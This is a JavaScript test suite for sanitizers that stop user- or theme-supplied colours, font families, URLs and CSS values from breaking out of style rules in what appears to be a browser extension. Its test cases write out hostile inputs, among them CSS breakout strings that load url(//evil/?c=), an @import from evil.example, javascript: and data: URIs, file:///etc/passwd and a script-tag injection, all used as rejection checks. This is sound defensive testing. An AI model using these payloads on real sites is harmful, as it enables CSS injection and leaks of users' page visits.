/*
Phase 1.7: sanitizers for values that reach CSS and URL sinks.

Theme fields, the custom font, the custom background and per-course colours are
user- or theme-supplied and are written into a style element or a style
attribute. A value containing a closing brace can end our rule and start its
own; one containing a url can make the browser fetch an arbitrary address,
leaking the page visit even though it cannot run script.

These validate by shape, not by rejecting known-bad substrings, so the tests
include values nobody would have thought to blocklist.

Run: node test/sanitize.test.js
*/
"use strict";
const path = require("path");
const assert = require("assert");
const S = require(path.resolve(__dirname, "../js/sanitize.js"));

let failures = 0;
function test(name, fn) {
    try {
        const r = fn();
        if (r && typeof r.then === "function") throw new Error("test body must be synchronous");
        console.log(`  PASS  ${name}`);
    } catch (e) { failures++; console.log(`  FAIL  ${name}\n        ${e.message}`); }
}
const ok = (v) => assert.notStrictEqual(v, "", "should have been accepted");
const no = (v, why) => assert.strictEqual(v, "", why || "should have been refused");

console.log("\nsanitizers\n");

/* ---------------- colours ---------------- */
test("valid colours pass unchanged", () => {
    for (const c of ["#fff", "#ff0000", "#ff0000aa", "rgb(1,2,3)", "rgba(1,2,3,0.5)",
                     "hsl(200, 50%, 40%)", "red", "transparent", "rebeccapurple"]) {
        assert.strictEqual(S.sanitizeCssColor(c), c, `${c} should pass`);
    }
});

test("a colour cannot close the declaration", () => {
    no(S.sanitizeCssColor("red;} body{display:none}"));
    no(S.sanitizeCssColor("#fff}"));
    no(S.sanitizeCssColor("red; background: url(//evil)"));
});

test("a colour cannot smuggle a url or an import", () => {
    no(S.sanitizeCssColor("url(//evil/x.png)"));
    no(S.sanitizeCssColor("@import url(//evil)"));
    no(S.sanitizeCssColor("expression(alert(1))"));
});

test("non-strings and empties are refused", () => {
    for (const v of [null, undefined, 42, {}, [], "", "   "]) no(S.sanitizeCssColor(v));
});

/* ---------------- font families ---------------- */
test("real font families pass", () => {
    for (const f of ["Rubik", "'EB Garamond', serif", '"Wix Madefor Text", sans-serif',
                     "Inconsolata", "Open Sans, Arial"]) ok(S.sanitizeFontFamily(f));
});

test("a font family cannot break out of the rule", () => {
    // This is the reported shape: the family lands inside a rule in a <style>.
    no(S.sanitizeFontFamily("x} body{background:url(//evil/?c=)} *{"),
        "a closing brace would end our rule and start the attacker's");
    no(S.sanitizeFontFamily('a"),url(//evil'));
    no(S.sanitizeFontFamily("serif; background: red"));
    no(S.sanitizeFontFamily("</style><script>alert(1)</script>"));
});

test("a font family cannot contain a function call", () => {
    no(S.sanitizeFontFamily("url(x)"));
    no(S.sanitizeFontFamily("local(evil)"));
});

test("an absurdly long family is refused", () => {
    no(S.sanitizeFontFamily("a".repeat(500)));
});

/* ---------------- URLs ---------------- */
test("http and https pass", () => {
    ok(S.sanitizeHttpUrl("https://example.com/a.png"));
    ok(S.sanitizeHttpUrl("http://example.com/a.png"));
});

test("every other scheme is refused, without naming them", () => {
    // The check accepts only http/https, so these fail by default rather than
    // by appearing on a blocklist.
    for (const u of ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
                     "blob:https://x/y", "file:///etc/passwd", "vbscript:msgbox",
                     "chrome-extension://abc/x.png", "ftp://x/y", "JaVaScRiPt:alert(1)"]) {
        no(S.sanitizeHttpUrl(u), `${u} should be refused`);
    }
});

test("a url cannot terminate the css function or the attribute", () => {
    no(S.sanitizeHttpUrl('https://e/x.png") ; background: url(//evil'));
    no(S.sanitizeHttpUrl("https://e/x.png') url(//evil"));
});

/* ---------------- general CSS values ---------------- */
test("theme sidebar values with a gradient and a url pass", () => {
    // A real bundled-theme value shape.
    const v = 'linear-gradient(#2e3943c7, #14181dc7), center url("https://example.com/bg.png")';
    const out = S.sanitizeCssValue(v);
    ok(out);
    assert.ok(out.includes("linear-gradient"), "the gradient should survive");
    assert.ok(out.includes("https://example.com/bg.png"), "the url should survive");
});

test("plain colours pass as css values", () => {
    assert.strictEqual(S.sanitizeCssValue("#1e1e1e"), "#1e1e1e");
});

test("a css value cannot close the rule", () => {
    no(S.sanitizeCssValue("red} body{background:url(//evil/?c=1)}"));
    no(S.sanitizeCssValue("#fff; } * { display:none"));
});

test("a url() inside a css value is scheme-checked", () => {
    no(S.sanitizeCssValue("url(javascript:alert(1))"));
    no(S.sanitizeCssValue('url("data:text/html,<script>alert(1)</script>")'));
    no(S.sanitizeCssValue("linear-gradient(red, blue), url(javascript:alert(1))"),
        "one bad url must reject the whole value, not just that segment");
});

test("an @import cannot be smuggled through a css value", () => {
    no(S.sanitizeCssValue("@import url(https://evil.example/x.css)"));
});

test("an absurdly long value is refused", () => {
    no(S.sanitizeCssValue("a".repeat(3000)));
});

test("the breakout backstop catches what the shape whitelist cannot", () => {
    // The whitelist has to allow "name(...)" so gradients work, which means it
    // cannot tell linear-gradient( from expression(. The backstop regex is the
    // only thing that distinguishes them.
    //
    // Added after a mutation that removed the backstop failed to turn the suite
    // red -- the existing cases were all caught by the shape checks, so nothing
    // exercised the backstop at all.
    const shapeWhitelist = /^[\w\s#.,%()\/'" -]*$/;
    assert.ok(shapeWhitelist.test("expression(alert(1))"),
        "precondition: the shape check alone would accept this");
    no(S.sanitizeCssValue("expression(alert(1))"));
    no(S.sanitizeCssValue("linear-gradient(red, blue) expression(alert(1))"));
    no(S.sanitizeCssColor("expression(alert(1))"));
    no(S.sanitizeFontFamily("expression(alert(1))"));
});

/* ---------------- applied at the sinks ---------------- */
const fs = require("fs");
const content = fs.readFileSync(path.resolve(__dirname, "../js/content.js"), "utf8");

test("the custom font family is sanitized before it reaches a style element", () => {
    assert.ok(/sanitizeFontFamily\(options\.custom_font\.family\)/.test(content),
        "custom_font.family goes straight into a <style> rule otherwise");
    assert.ok(!/font-family: \$\{options\.custom_font\.family\}/.test(content),
        "the raw value is still interpolated into the rule");
});

test("theme preset values are sanitized before becoming custom properties", () => {
    assert.ok(/sanitizeCssValue\(options\.dark_preset\[key\]\)/.test(content),
        "dark_preset values are theme-supplied and land in a :root block");
});

test("theme-supplied image and background urls are scheme-checked", () => {
    assert.ok(/sanitizeHttpUrl\(activeBackground\.url\)/.test(content));
    assert.ok(/sanitizeHttpUrl\(cardOptions\.img\)/.test(content));
});

test("per-course colours are sanitized before entering a style attribute", () => {
    assert.ok(/sanitizeCssColor\(courseColor\)/.test(content));
    const stripped = content.replace(/^\s*\/\/.*$/gm, "");
    assert.ok(!/background-color:\$\{courseColor\}/.test(stripped),
        "the unsanitized colour still reaches a style attribute");
});

console.log(`\n${failures === 0 ? "all passed" : failures + " FAILED"}\n`);
process.exit(failures === 0 ? 0 : 1);
